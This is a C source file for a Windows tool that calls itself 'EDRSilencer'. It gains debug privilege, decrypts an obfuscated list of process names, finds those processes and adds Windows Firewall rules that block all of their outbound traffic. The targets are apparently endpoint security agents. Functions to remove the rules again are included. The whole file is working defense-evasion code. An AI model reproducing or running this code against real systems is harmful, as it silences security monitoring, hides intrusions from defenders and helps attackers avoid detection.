#include <initguid.h> // Must be included first to define GUIDs
#include "firewall.h"
#define _WIN32_DCOM
#include <windows.h>
#include <strsafe.h>
#include "errors.h"

// --- Helper Functions for COM and BSTR Management ---

static BSTR AnsiToBSTR(const char* input) {
    if (!input) return NULL;
    int lenA = lstrlenA(input);
    int lenW = MultiByteToWideChar(CP_ACP, 0, input, lenA, NULL, 0);
    if (lenW == 0) return NULL;
    BSTR bstr = SysAllocStringLen(NULL, lenW);
    if (bstr) {
        MultiByteToWideChar(CP_ACP, 0, input, lenA, bstr, lenW);
    }
    return bstr;
}

// Encapsulates COM initialization and INetFwPolicy2 creation
static HRESULT InitializeFirewallApi(INetFwPolicy2** ppFwPolicy) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        EPRINTF("[-] COM initialization failed: 0x%lX\n", hr);
        return hr;
    }
    
    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwPolicy2, (void**)ppFwPolicy);
    if (FAILED(hr)) {
        EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr);
        CoUninitialize();
    }
    return hr;
}

// Encapsulates COM cleanup
static void UninitializeFirewallApi(INetFwPolicy2* pFwPolicy) {
    if (pFwPolicy) {
        pFwPolicy->lpVtbl->Release(pFwPolicy);
    }
    CoUninitialize();
}

// Checks if the firewall is enabled on active profiles and warns if not.
static void CheckFirewallState(INetFwPolicy2* pFwPolicy) {
    long currentProfiles = 0;
    if (FAILED(pFwPolicy->lpVtbl->get_CurrentProfileTypes(pFwPolicy, &currentProfiles))) return;

    if (currentProfiles & NET_FW_PROFILE2_DOMAIN) {
        VARIANT_BOOL enabled;
        if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_DOMAIN, &enabled)) && enabled == VARIANT_FALSE) {
            PRINTF("[!] Warning: Firewall is disabled for the Domain profile.\n");
        }
    }
    if (currentProfiles & NET_FW_PROFILE2_PRIVATE) {
        VARIANT_BOOL enabled;
        if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_PRIVATE, &enabled)) && enabled == VARIANT_FALSE) {
            PRINTF("[!] Warning: Firewall is disabled for the Private profile.\n");
        }
    }
    if (currentProfiles & NET_FW_PROFILE2_PUBLIC) {
        VARIANT_BOOL enabled;
        if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_PUBLIC, &enabled)) && enabled == VARIANT_FALSE) {
            PRINTF("[!] Warning: Firewall is disabled for the Public profile.\n");
        }
    }
}

static BOOL FirewallRuleExists(INetFwPolicy2* pFwPolicy, PCWSTR appPath) {
    BOOL exists = FALSE;
    INetFwRules* pFwRules = NULL;
    if (FAILED(pFwPolicy->lpVtbl->get_Rules(pFwPolicy, &pFwRules))) return FALSE;

    IEnumVARIANT* pEnum = NULL;
    IUnknown* pUnk = NULL;
    if (SUCCEEDED(pFwRules->lpVtbl->get__NewEnum(pFwRules, &pUnk)) && pUnk) {
        pUnk->lpVtbl->QueryInterface(pUnk, &IID_IEnumVARIANT, (void**)&pEnum);
        pUnk->lpVtbl->Release(pUnk);
    }

    if (pEnum) {
        VARIANT var;
        VariantInit(&var);
        while (SUCCEEDED(pEnum->lpVtbl->Next(pEnum, 1, &var, NULL)) && var.vt == VT_DISPATCH) {
            INetFwRule* pFwRule = NULL;
            if (SUCCEEDED(var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&pFwRule))) {
                BSTR bstrGrouping = NULL;
                if (SUCCEEDED(pFwRule->lpVtbl->get_Grouping(pFwRule, &bstrGrouping)) && bstrGrouping && wcscmp(bstrGrouping, FIREWALL_RULE_GROUP) == 0) {
                    BSTR bstrAppPath = NULL;
                    if (SUCCEEDED(pFwRule->lpVtbl->get_ApplicationName(pFwRule, &bstrAppPath)) && bstrAppPath && _wcsicmp(bstrAppPath, appPath) == 0) {
                        exists = TRUE;
                    }
                    SysFreeString(bstrAppPath);
                }
                SysFreeString(bstrGrouping);
                pFwRule->lpVtbl->Release(pFwRule);
            }
            VariantClear(&var);
            if (exists) break;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    pFwRules->lpVtbl->Release(pFwRules);
    return exists;
}

// --- Public Functions ---

void FirewallAddRuleByPath(const char* processPath) {
    INetFwPolicy2* pFwPolicy = NULL;
    if (FAILED(InitializeFirewallApi(&pFwPolicy))) return;

    wchar_t wProcessPath[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, wProcessPath, MAX_PATH) == 0) {
        UninitializeFirewallApi(pFwPolicy);
        return;
    }

    if (FirewallRuleExists(pFwPolicy, wProcessPath)) {
        WPRINTF(L"[!] Firewall rule for %s already exists. Skipping.\n", wProcessPath);
    } else {
        INetFwRule* pFwRule = NULL;
        HRESULT hr = CoCreateInstance(&CLSID_NetFwRule, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwRule, (void**)&pFwRule);
        if (SUCCEEDED(hr)) {
            const char* filename = strrchr(processPath, '\\');
            filename = filename ? filename + 1 : processPath;
            char ruleNameAnsi[MAX_PATH];
            StringCchPrintfA(ruleNameAnsi, MAX_PATH, "EDRSilencer Block Rule for %s", filename);

            BSTR bstrRuleName = AnsiToBSTR(ruleNameAnsi);
            BSTR bstrAppPath = AnsiToBSTR(processPath);
            BSTR bstrGrouping = SysAllocString(FIREWALL_RULE_GROUP);

            pFwRule->lpVtbl->put_Name(pFwRule, bstrRuleName);
            pFwRule->lpVtbl->put_ApplicationName(pFwRule, bstrAppPath);
            pFwRule->lpVtbl->put_Action(pFwRule, NET_FW_ACTION_BLOCK);
            pFwRule->lpVtbl->put_Direction(pFwRule, NET_FW_RULE_DIR_OUT);
            pFwRule->lpVtbl->put_Grouping(pFwRule, bstrGrouping);
            pFwRule->lpVtbl->put_Enabled(pFwRule, VARIANT_TRUE);
            pFwRule->lpVtbl->put_Profiles(pFwRule, NET_FW_PROFILE2_ALL);
            pFwRule->lpVtbl->put_Protocol(pFwRule, 256); // NET_FW_IP_PROTOCOL_ANY

            INetFwRules* pFwRules = NULL;
            if(SUCCEEDED(pFwPolicy->lpVtbl->get_Rules(pFwPolicy, &pFwRules))) {
                hr = pFwRules->lpVtbl->Add(pFwRules, pFwRule);
                if (SUCCEEDED(hr)) {
                    WPRINTF(L"[+] Firewall block rule added for %s.\n", wProcessPath);
                } else {
                    EPRINTF("[-] Failed to add firewall rule. Error: 0x%lX\n", hr);
                }
                pFwRules->lpVtbl->Release(pFwRules);
            }

            SysFreeString(bstrRuleName);
            SysFreeString(bstrAppPath);
            SysFreeString(bstrGrouping);
            pFwRule->lpVtbl->Release(pFwRule);
        }
    }

    UninitializeFirewallApi(pFwPolicy);
}

void FirewallConfigureBlockRules() {
    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
    
    INetFwPolicy2* pFwPolicy = NULL;
    if (FAILED(InitializeFirewallApi(&pFwPolicy))) return;
    
    CheckFirewallState(pFwPolicy); // Check and warn if firewall is off

    // Close policy handle before iterating processes to avoid holding the handle for a long time.
    // Each call to FirewallAddRuleByPath will re-initialize it.
    UninitializeFirewallApi(pFwPolicy);

    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) return;

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { decryptedNames[i] = decryptString(processData[i]); }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
                        WCHAR fullPathW[MAX_PATH];
                        char fullPathA[MAX_PATH];
                        if (getProcessFullPath(pe32.th32ProcessID, fullPathW, MAX_PATH)) {
                            if(WideCharToMultiByte(CP_ACP, 0, fullPathW, -1, fullPathA, MAX_PATH, NULL, NULL)) {
                                FirewallAddRuleByPath(fullPathA);
                            }
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]); }
    HeapFree(g_hHeap, 0, decryptedNames);
}

void FirewallRemoveAllRules() {
    INetFwPolicy2* pFwPolicy = NULL;
    if (FAILED(InitializeFirewallApi(&pFwPolicy))) return;

    INetFwRules* pFwRules = NULL;
    if (FAILED(pFwPolicy->lpVtbl->get_Rules(pFwPolicy, &pFwRules))) {
        UninitializeFirewallApi(pFwPolicy);
        return;
    }

    long ruleCount = 0;
    pFwRules->lpVtbl->get_Count(pFwRules, &ruleCount);
    if (ruleCount == 0) {
        PRINTF("[+] No firewall rules to process.\n");
        pFwRules->lpVtbl->Release(pFwRules);
        UninitializeFirewallApi(pFwPolicy);
        return;
    }
    
    ULONG removedCount = 0;
    IEnumVARIANT* pEnum = NULL;
    IUnknown* pUnk = NULL;
    if (SUCCEEDED(pFwRules->lpVtbl->get__NewEnum(pFwRules, &pUnk)) && pUnk) {
        pUnk->lpVtbl->QueryInterface(pUnk, &IID_IEnumVARIANT, (void**)&pEnum);
        pUnk->lpVtbl->Release(pUnk);
    }
    
    if (pEnum) {
        VARIANT var;
        VariantInit(&var);
        while (SUCCEEDED(pEnum->lpVtbl->Next(pEnum, 1, &var, NULL)) && var.vt == VT_DISPATCH) {
            INetFwRule* pFwRule = NULL;
            if (SUCCEEDED(var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&pFwRule))) {
                BSTR bstrGrouping = NULL;
                if (SUCCEEDED(pFwRule->lpVtbl->get_Grouping(pFwRule, &bstrGrouping)) && bstrGrouping && wcscmp(bstrGrouping, FIREWALL_RULE_GROUP) == 0) {
                    BSTR bstrName = NULL;
                    if(SUCCEEDED(pFwRule->lpVtbl->get_Name(pFwRule, &bstrName)) && bstrName) {
                        if(SUCCEEDED(pFwRules->lpVtbl->Remove(pFwRules, bstrName))) {
                            removedCount++;
                        }
                        SysFreeString(bstrName);
                    }
                }
                SysFreeString(bstrGrouping);
                pFwRule->lpVtbl->Release(pFwRule);
            }
            VariantClear(&var);
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    
    if (removedCount > 0) {
        PRINTF("[+] Removed %lu firewall rule(s) created by this tool.\n", removedCount);
    } else {
        PRINTF("[+] No firewall rules from this tool were found to remove.\n");
    }

    pFwRules->lpVtbl->Release(pFwRules);
    UninitializeFirewallApi(pFwPolicy);
}

void FirewallRemoveRuleByName(const char* ruleName) {
    INetFwPolicy2* pFwPolicy = NULL;
    if (FAILED(InitializeFirewallApi(&pFwPolicy))) return;
    
    INetFwRules* pFwRules = NULL;
    if (SUCCEEDED(pFwPolicy->lpVtbl->get_Rules(pFwPolicy, &pFwRules))) {
        BSTR bstrRuleName = AnsiToBSTR(ruleName);
        if (bstrRuleName) {
            if (SUCCEEDED(pFwRules->lpVtbl->Remove(pFwRules, bstrRuleName))) {
                PRINTF("[+] Successfully removed firewall rule: %s\n", ruleName);
            } else {
                EPRINTF("[-] Rule '%s' not found or could not be removed.\n", ruleName);
            }
            SysFreeString(bstrRuleName);
        }
        pFwRules->lpVtbl->Release(pFwRules);
    }

    UninitializeFirewallApi(pFwPolicy);
}

void FirewallRemoveRuleByPath(const char* processPath) {
    const char* filename = strrchr(processPath, '\\');
    filename = filename ? filename + 1 : processPath;
    char ruleNameAnsi[MAX_PATH];
    StringCchPrintfA(ruleNameAnsi, MAX_PATH, "EDRSilencer Block Rule for %s", filename);
    FirewallRemoveRuleByName(ruleNameAnsi);
}